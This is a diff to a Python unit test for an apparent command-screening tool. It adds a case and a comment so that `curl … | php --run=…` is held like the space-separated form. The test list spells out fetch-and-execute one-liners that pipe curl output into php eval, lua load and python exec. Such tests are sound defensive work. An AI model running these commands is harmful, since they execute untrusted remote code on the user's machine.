@@ -4337,7 +4337,10 @@ class HarmlessStops(unittest.TestCase):
         (python3 -Em json.tool) is no inline code."""
         code = "'eval(stream_get_contents(STDIN));'"
         held = [f"curl {CURL} | php -R 'eval($argn);'", f"curl {CURL} | php -B {code}", f"curl {CURL} | php -E {code}",
-                f"curl {CURL} | php --run {code}", f"curl {CURL} | php --process-begin {code}",
+                # held, not denied, either way --run is spelled: inline code may only parse the data (main denied
+                # `--run=…` only because it read it as an unknown option and php as reading its program from stdin)
+                f"curl {CURL} | php --run {code}", f"curl {CURL} | php --run={code}",
+                f"curl {CURL} | php --process-begin {code}",
                 f"curl {CURL} | php --process-code 'eval($argn);'", f"curl {CURL} | php --process-end {code}",
                 f"curl {CURL} | php -r{code}", f"curl {CURL} | lua -e'load(io.read(\"a\"))()'",
                 f"curl {CURL} | python3 -c'exec(input())'",
